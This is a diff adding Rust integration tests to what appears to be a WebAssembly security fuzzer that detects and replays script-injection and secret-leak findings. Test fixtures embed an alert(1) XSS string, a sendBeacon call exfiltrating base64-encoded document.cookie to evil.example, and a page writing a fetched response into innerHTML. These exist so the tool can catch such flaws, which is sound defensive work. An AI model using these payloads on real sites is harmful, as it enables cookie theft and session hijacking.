@@ -28,8 +28,14 @@ fn component(wit: &str, wat: &str) -> Vec<u8> {
 impl Fixture {
     fn new(echo: bool) -> Self {
         static NEXT: AtomicU64 = AtomicU64::new(0);
-        let dir = std::env::temp_dir().join(format!("appfuzz-workflow-{}-{}", std::process::id(), NEXT.fetch_add(1, Ordering::Relaxed)));
-        std::fs::create_dir_all(&dir).unwrap();
+        let dir = loop {
+            let candidate = std::env::temp_dir().join(format!("appfuzz-workflow-{}-{}", std::process::id(), NEXT.fetch_add(1, Ordering::Relaxed)));
+            match std::fs::create_dir(&candidate) {
+                Ok(()) => break candidate,
+                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
+                Err(e) => panic!("creating {}: {e}", candidate.display()),
+            }
+        };
         let manifest = dir.join("appfuzz.toml");
         let (wit, wat, request, output) = if echo {
             (
@@ -314,6 +320,166 @@ fn generation_configuration_errors_are_distinct_from_guest_crashes() {
     let (code, converted) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"generate":{"numbers":"cast:-1"}}}"#]);
     assert_eq!(code, 0, "{converted}");
     assert_eq!(converted["result"], json!(u32::MAX));
+}
+
+fn browser_named_target(body: &str) -> Vec<u8> {
+    let escaped = body.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
+    wat::parse_str(format!(
+        r#"(component
+        (core module $m
+            (memory (export "memory") 1)
+            (data (i32.const 64) "{escaped}")
+            (func (export "session") (result i32)
+                (i32.store (i32.const 0) (i32.const 64))
+                (i32.store (i32.const 4) (i32.const {length})) (i32.const 0)))
+        (core instance $m (instantiate $m))
+        (alias core export $m "memory" (core memory $memory))
+        (func $session (result string) (canon lift (core func $m "session") (memory $memory)))
+        (instance $page (export "session" (func $session)))
+        (export "appfuzz:browser/page" (instance $page)))"#,
+        length = body.len()
+    ))
+    .unwrap()
+}
+
+#[test]
+fn targets_using_the_browser_export_keep_their_output_policy_and_budgets() {
+    let f = Fixture::new(false);
+    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\n[entry]\nexport='appfuzz:browser/page#session'\noutput={body='',body_format='html'}\nresult={''='html:safe'}\n[limits]\nfuel=1\n").unwrap();
+    std::fs::write(f.dir.join("app.wasm"), browser_named_target("<script>alert(1)</script>")).unwrap();
+    let (_, run) = f.cli(&["run", "--fuel", "10000"]);
+    assert!(run["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output"), "{run}");
+    assert!(run["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel"), "{run}");
+    let id = run["run"].as_str().unwrap();
+    let mut results = Vec::new();
+    for rebuilt in [false, true] {
+        if rebuilt {
+            std::fs::write(f.dir.join("app.wasm"), browser_named_target("<p>new build</p>")).unwrap();
+        }
+        let (code, explained) = f.cli(&["explain", id]);
+        assert_eq!(code, 0, "{explained}");
+        results.push((rebuilt, "explain", explained["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output")));
+        let (code, summary) = f.cli(&["show", id, "--view", "summary"]);
+        assert_eq!(code, 0, "{summary}");
+        results.push((rebuilt, "summary", summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1)));
+    }
+    assert!(results.iter().all(|(_, _, correct)| *correct), "{results:?}");
+}
+
+#[test]
+fn genuine_browser_runs_use_the_browser_budget_even_with_an_older_contract() {
+    let f = Fixture::new(true);
+    f.edit("\"safe\"", &toml::Value::String("<script>navigator.sendBeacon('https://evil.example/collect','public')</script>".into()).to_string());
+    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
+    f.edit("cost_per_request = 100", "cost_per_request = 0");
+    let (_, visits) = f.cli(&["probe", "scripts"]);
+    assert_eq!(visits["status"], "complete", "{visits}");
+    let id = visits["pages"][0]["browser_run"].as_str().unwrap();
+    let (_, value) = f.cli(&["show", id]);
+    let mut r: appfuzz_core::record::RunRecord = serde_json::from_value(value).unwrap();
+    assert!(r.totals.cost > 0);
+    for legacy in [false, true] {
+        if legacy {
+            r.spec.contract = "a previous engine contract".into();
+            r.id = r.spec.id();
+            appfuzz_core::store::RunStore::new(&f.dir.join("state")).save(&r).unwrap();
+        }
+        let (code, summary) = f.cli(&["show", &r.id, "--view", "summary"]);
+        assert_eq!(code, 0, "{summary}");
+        assert!(summary["over_limits"].as_array().unwrap().is_empty(), "{summary}");
+        let (code, explanation) = f.cli(&["explain", &r.id]);
+        assert_eq!(code, 0, "{explanation}");
+        assert!(explanation["findings"].as_array().unwrap().iter().all(|f| f["kind"] != "over_budget"), "{explanation}");
+    }
+}
+
+#[test]
+fn reviewing_the_browser_binary_itself_uses_the_targets_own_contract() {
+    let f = Fixture::new(false);
+    std::fs::write(f.dir.join("app.wasm"), appfuzz_core::browser::GUEST).unwrap();
+    let input = json!({"url":"https://app.example/","html":"<p>hello</p>"}).to_string();
+    std::fs::write(
+        &f.manifest,
+        format!(
+            "[app]\nwasm='app.wasm'\n[entry]\nexport='appfuzz:browser/page#session'\nrequest={}\n[limits]\nfuel=1\nmemory='256MiB'\n",
+            toml::Value::String(input.clone())
+        ),
+    )
+    .unwrap();
+    let (_, run) = f.cli(&["run", "--fuel", "200000000"]);
+    assert!(run["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel"), "{run}");
+    let id = run["run"].as_str().unwrap();
+    let (code, summary) = f.cli(&["show", id, "--view", "summary"]);
+    assert_eq!(code, 0, "{summary}");
+    assert!(summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1), "{summary}");
+    let (_, value) = f.cli(&["show", id]);
+    let mut archived: appfuzz_core::record::RunRecord = serde_json::from_value(value).unwrap();
+    archived.spec.contract = "a previous target contract".into();
+    archived.id = archived.spec.id();
+    let store = appfuzz_core::store::RunStore::new(&f.dir.join("state"));
+    store.save(&archived).unwrap();
+    let (code, summary) = f.cli(&["show", &archived.id, "--view", "summary"]);
+    assert_eq!(code, 0, "{summary}");
+    assert!(summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1), "{summary}");
+
+    // A genuine visit uses the same bytes with the built-in browser contract.
+    let browser = &appfuzz_core::browser::Browser::shared().unwrap().app;
+    let spec = browser.spec(browser.default_export().unwrap(), vec![json!(input)], appfuzz_core::plan::Plan::default(), 1);
+    let visit = browser.run(&spec);
+    assert_eq!(visit.outcome.kind, appfuzz_core::record::OutcomeKind::Ok, "{:?}", visit.outcome);
+    assert_eq!(visit.spec.component, archived.spec.component);
+    store.save(&visit).unwrap();
+    let (code, summary) = f.cli(&["show", &visit.id, "--view", "summary"]);
+    assert_eq!(code, 0, "{summary}");
+    assert!(summary["over_limits"].as_array().unwrap().is_empty(), "{summary}");
+}
+
+fn private_result_fixture(encoded: bool, publish: bool) -> Vec<u8> {
+    let mut source = include_str!("../../appfuzz-core/tests/fixtures/encoded_result.wat").to_string();
+    if !publish {
+        source = source
+            .replace("(i32.store (i32.const 8) (i32.const 8192))", "(i32.store (i32.const 8) (i32.const 128))")
+            .replace("(i32.store (i32.const 12) (i32.mul (local.get $n) (i32.const 2)))", "(i32.store (i32.const 12) (i32.const 2))");
+    } else if !encoded {
+        source = source
+            .replace("(i32.store (i32.const 8) (i32.const 8192))", "(i32.store (i32.const 8) (i32.load (i32.const 1024)))")
+            .replace("(i32.store (i32.const 12) (i32.mul (local.get $n) (i32.const 2)))", "(i32.store (i32.const 12) (local.get $n))");
+    }
+    wat::parse_str(source).unwrap()
+}
+
+#[test]
+fn invalid_response_mappings_keep_privacy_findings_confirmable_and_replayable() {
+    for (encoded, output) in [(false, "body='',body_format='text'"), (true, "body='body',headers='metadata',body_format='text'")] {
+        let f = Fixture::new(false);
+        std::fs::write(
+            &f.manifest,
+            format!("[app]\nwasm='app.wasm'\n[entry]\nexport='run'\noutput={{{output}}}\n[functions.\"test:payload/config#key\"]\nresult='secret'\n"),
+        )
+        .unwrap();
+        std::fs::write(f.dir.join("app.wasm"), private_result_fixture(encoded, true)).unwrap();
+        let plan = r#"{"test:payload/config#key":{"return":"sk_private_output_0123456789"}}"#;
+        let (_, run) = f.cli(&["run", "--plan", plan]);
+        let kind = if encoded { "encoded_flow" } else { "secret_leak" };
+        let finding = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == kind).unwrap_or_else(|| panic!("{run}"));
+        assert_eq!(finding["severity"], "fail", "{finding}");
+        let (_, confirmation) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "32"]);
+        assert_eq!(confirmation["confirmed"], true, "{confirmation}");
+        let case = confirmation["case"].as_str().unwrap();
+        let saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
+        assert_eq!(saved["finding"]["detail"]["at"], "metadata", "{saved}");
+        let (code, replayed) = f.cli(&["replay", case]);
+        assert_eq!(code, 0, "{replayed}");
+        assert_eq!(replayed["reproduced"], true, "{replayed}");
+        std::fs::write(f.dir.join("app.wasm"), private_result_fixture(encoded, false)).unwrap();
+        let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
+        assert_eq!(code, 0, "{replayed}");
+        assert_eq!(replayed["reproduced"], false, "{replayed}");
+        let (_, fixed) = f.cli(&["run", "--plan", plan]);
+        assert_eq!(fixed["outcome"]["kind"], "ok", "{fixed}");
+        assert_eq!(fixed["result"]["metadata"], "ok", "{fixed}");
+        assert_eq!(fixed["calls_per_function"]["test:payload/config#key"], 1, "{fixed}");
+    }
 }
 
 /// `probe scripts` runs the page's own script: the link's #fragment put
@@ -2948,6 +3114,116 @@ fn browser_probe_keeps_the_secret_leak_before_a_hang() {
 }
 
 #[test]
+fn encoded_browser_cookie_beacons_are_confirmed_replayed_and_regressed() {
+    let f = Fixture::new(true);
+    let page = "<script>navigator.sendBeacon('https://evil.example/collect',btoa(document.cookie))</script>";
+    let build = |page: &str| {
+        let escaped = page.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
+        component(
+            "package test:workflow; world app { export run:func(input:string)->string; }",
+            &format!(
+                r#"(module
+                (memory (export "memory") 4)
+                (data (i32.const 64) "{escaped}")
+                (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
+                (func (export "run") (param i32 i32) (result i32)
+                    (i32.store (i32.const 0) (i32.const 64))
+                    (i32.store (i32.const 4) (i32.const {length})) (i32.const 0)))"#,
+                length = page.len()
+            ),
+        )
+    };
+    std::fs::write(f.dir.join("app.wasm"), build(page)).unwrap();
+    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
+    let (_, out) = f.cli(&["probe", "scripts"]);
+    assert_eq!(out["status"], "complete", "{out}");
+    let leak = out["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "encoded_flow").unwrap_or_else(|| panic!("{out}"));
+    assert_eq!(leak["severity"], "fail", "{leak}");
+    let (_, explained) = f.cli(&["explain", leak["run"].as_str().unwrap()]);
+    let evidence = explained["findings"].as_array().unwrap().iter().find(|f| f["id"] == leak["id"]).unwrap();
+    assert_eq!(evidence["detail"]["encoding"], "base64", "{evidence}");
+    let (_, browser) = f.cli(&["show", evidence["detail"]["browser_run"].as_str().unwrap()]);
+    let beacon = browser["events"].as_array().unwrap().iter().find(|e| e["func"] == "appfuzz:browser/net#fetch-other").unwrap();
+    assert_eq!(beacon["args"]["kind"], "beacon", "{beacon}");
+    assert!(!appfuzz_core::value::some(&beacon["args"]["body"]).and_then(Value::as_str).unwrap().contains("sk_"), "{beacon}");
+    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "4"]);
+    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
+    let case = confirmed["case"].as_str().unwrap();
+    let (code, replayed) = f.cli(&["replay", case]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], true, "{replayed}");
+    std::fs::write(f.dir.join("app.wasm"), build(&page.replace("btoa(document.cookie)", "'public message'"))).unwrap();
+    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], false, "{replayed}");
+    let (_, fixed) = f.cli(&["probe", "scripts"]);
+    assert_eq!(fixed["status"], "complete", "{fixed}");
+    assert!(fixed["findings"].as_array().unwrap().iter().all(|f| f["kind"] != "encoded_flow"), "{fixed}");
+    let (_, browser) = f.cli(&["show", fixed["pages"][0]["browser_run"].as_str().unwrap()]);
+    assert!(
+        browser["events"].as_array().unwrap().iter().any(|e| e["func"] == "appfuzz:browser/net#fetch-other"
+            && appfuzz_core::value::some(&e["args"]["body"]).and_then(Value::as_str) == Some("public message")),
+        "{browser}"
+    );
+}
+
+fn browser_post_echo_fixture(sink: &str) -> Vec<u8> {
+    let page = format!(
+        "<!doctype html><p id=g></p><script>fetch('/api',{{method:'POST',body:decodeURIComponent(location.hash.slice(1))}}).then(r=>r.text()).then(t=>document.getElementById('g').{sink}=t)</script>"
+    );
+    let escaped = page.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
+    wat::parse_str(format!(
+        r#"(module
+        (import "fastly_http_req" "body_downstream_get" (func $request (param i32 i32) (result i32)))
+        (import "fastly_http_req" "uri_get" (func $uri (param i32 i32 i32 i32) (result i32)))
+        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
+        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
+        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
+        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
+        (import "fastly_http_body" "read" (func $read (param i32 i32 i32 i32) (result i32)))
+        (memory (export "memory") 1)
+        (data (i32.const 512) "{escaped}")
+        (func (export "_start")
+            (drop (call $request (i32.const 0) (i32.const 4)))
+            (drop (call $uri (i32.load (i32.const 0)) (i32.const 8192) (i32.const 1024) (i32.const 16)))
+            (drop (call $new (i32.const 8))) (drop (call $body (i32.const 12)))
+            (if (i32.eq (i32.load (i32.const 16)) (i32.const 23))
+                (then
+                    (drop (call $read (i32.load (i32.const 4)) (i32.const 9408) (i32.const 1024) (i32.const 20)))
+                    (drop (call $write (i32.load (i32.const 12)) (i32.const 9408) (i32.load (i32.const 20)) (i32.const 0) (i32.const 24))))
+                (else
+                    (drop (call $write (i32.load (i32.const 12)) (i32.const 512) (i32.const {length}) (i32.const 0) (i32.const 24)))))
+            (drop (call $send (i32.load (i32.const 8)) (i32.load (i32.const 12)) (i32.const 0)))))"#,
+        length = page.len()
+    ))
+    .unwrap()
+}
+
+#[test]
+fn browser_post_body_flows_through_the_real_app_and_dom_finding_replays() {
+    let f = Fixture::new(false);
+    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
+    std::fs::write(f.dir.join("app.wasm"), browser_post_echo_fixture("innerHTML")).unwrap();
+    let (_, out) = f.cli(&["probe", "scripts"]);
+    assert_eq!(out["status"], "complete", "{out}");
+    let finding = out["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
+    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "4"]);
+    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
+    let case = confirmed["case"].as_str().unwrap();
+    let (code, replayed) = f.cli(&["replay", case]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], true, "{replayed}");
+    std::fs::write(f.dir.join("app.wasm"), browser_post_echo_fixture("textContent")).unwrap();
+    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], false, "{replayed}");
+    let (_, api) = f.cli(&["show", "last"]);
+    assert_eq!(api["spec"]["args"][0]["method"], "POST", "{api}");
+    assert!(api["spec"]["args"][0]["body"].as_str().is_some_and(|s| !s.is_empty()), "{api}");
+    assert_eq!(api["result"]["body"], api["spec"]["args"][0]["body"], "{api}");
+}
+
+#[test]
 fn browser_probe_executes_script_sent_before_a_child_crash() {
     let f = Fixture::new(false);
     std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
@@ -3192,6 +3468,39 @@ fn browser_cookie_secrets_logged_by_api_requests_confirm_replay_and_regress() {
     let (_, api) = f.cli(&["show", "last"]);
     assert_eq!(api["result"]["status"], 200, "{api}");
 }
+
+#[test]
+fn encoded_browser_cookies_in_api_logs_confirm_replay_and_regress() {
+    let f = Fixture::new(false);
+    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
+    let source = include_str!("fixtures/browser_cookie_log.wat").replace("(call $log ", "(call $log_hex ");
+    let source = source.replace("(func $no_log", &format!("{}\n(func $no_log", include_str!("fixtures/browser_cookie_hex_log.wat")));
+    std::fs::write(f.dir.join("app.wasm"), wat::parse_str(source).unwrap()).unwrap();
+    let (_, out) = f.cli(&["probe", "scripts"]);
+    let leak = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "encoded_flow").unwrap_or_else(|| panic!("{out}"));
+    assert_eq!(leak["severity"], "fail", "{leak}");
+    let (_, explained) = f.cli(&["explain", leak["run"].as_str().unwrap()]);
+    let shown = explained["findings"].as_array().unwrap().iter().find(|v| v["id"] == leak["id"]).unwrap();
+    assert_eq!(shown["detail"]["encoding"], "hex", "{shown}");
+    let nested = shown["detail"]["nested_run"].as_str().unwrap();
+    let (_, api) = f.cli(&["show", nested]);
+    let cookie = api["spec"]["args"][0]["headers"].as_array().unwrap().iter().find(|h| h[0] == "cookie").unwrap()[1].as_str().unwrap();
+    let encoded: String = cookie.bytes().map(|b| format!("{b:02x}")).collect();
+    assert_eq!(api["stdout"], encoded, "{api}");
+    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "10"]);
+    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
+    let case = confirmed["case"].as_str().unwrap();
+    let (code, replayed) = f.cli(&["replay", case]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], true);
+    std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(false, CookieReply::Ok)).unwrap();
+    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
+    assert_eq!(code, 0, "{replayed}");
+    assert_eq!(replayed["reproduced"], false, "{replayed}");
+    let (_, api) = f.cli(&["show", "last"]);
+    assert_eq!(api["result"]["status"], 200, "{api}");
+}
+
 #[test]
 fn returning_the_callers_cookie_to_that_caller_is_not_a_new_leak() {
     let f = Fixture::new(false);
